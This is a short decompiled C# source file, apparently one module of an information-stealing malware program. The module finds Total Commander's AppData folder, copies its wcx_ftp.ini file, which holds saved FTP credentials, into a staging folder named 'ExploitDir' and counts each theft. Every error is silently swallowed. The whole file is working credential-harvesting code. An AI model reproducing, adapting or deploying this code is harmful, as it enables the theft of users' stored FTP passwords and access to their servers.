﻿using System;
using System.IO;

namespace SHARP
{
	// Token: 0x02000045 RID: 69
	internal class TotalCommander
	{
		// Token: 0x06000146 RID: 326 RVA: 0x0000725C File Offset: 0x0000545C
		public static void Start()
		{
			try
			{
				string text = Help.AppData + "\\GHISLER\\";
				if (Directory.Exists(text))
				{
					Directory.CreateDirectory(Help.ExploitDir + "\\FTP\\Total Commander");
				}
				FileInfo[] files = new DirectoryInfo(text).GetFiles();
				for (int i = 0; i < files.Length; i++)
				{
					if (files[i].Name.Contains("wcx_ftp.ini"))
					{
						File.Copy(text + "wcx_ftp.ini", Help.ExploitDir + "\\FTP\\Total Commander\\wcx_ftp.ini");
						Counting.totalcmd++;
					}
				}
			}
			catch
			{
			}
		}
	}
}
